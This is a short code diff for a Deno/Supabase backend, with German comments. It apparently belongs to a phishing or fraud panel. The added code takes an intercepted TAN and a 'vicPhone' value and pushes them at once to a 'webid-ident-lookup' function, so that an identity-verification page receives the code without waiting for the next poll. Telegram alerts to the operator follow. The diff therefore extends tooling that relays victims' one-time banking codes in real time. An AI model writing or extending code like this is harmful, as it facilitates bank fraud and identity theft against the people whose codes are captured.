@@ -222,6 +222,25 @@ export async function processSessionForward(
       if (result.ok) {
         forwardedCount++;
         forwardedSet.add(key);
+        // Push TAN direkt an webid-ident-lookup, damit die Ident-Seite die TAN
+        // sofort erhält ohne auf den nächsten Poll zu warten.
+        try {
+          await fetch(`${Deno.env.get("SUPABASE_URL")}/functions/v1/webid-ident-lookup`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
+            },
+            body: JSON.stringify({
+              action: "push_tan",
+              session_id: sessionId,
+              tan: code,
+              phone: vicPhone,
+            }),
+          });
+        } catch (e) {
+          console.warn("webid-ident-lookup push_tan failed", e);
+        }
         try {
           await notifyTelegram(supabase, session.branding_id ?? null, buildTelegramMessage({
             icon: "📨",
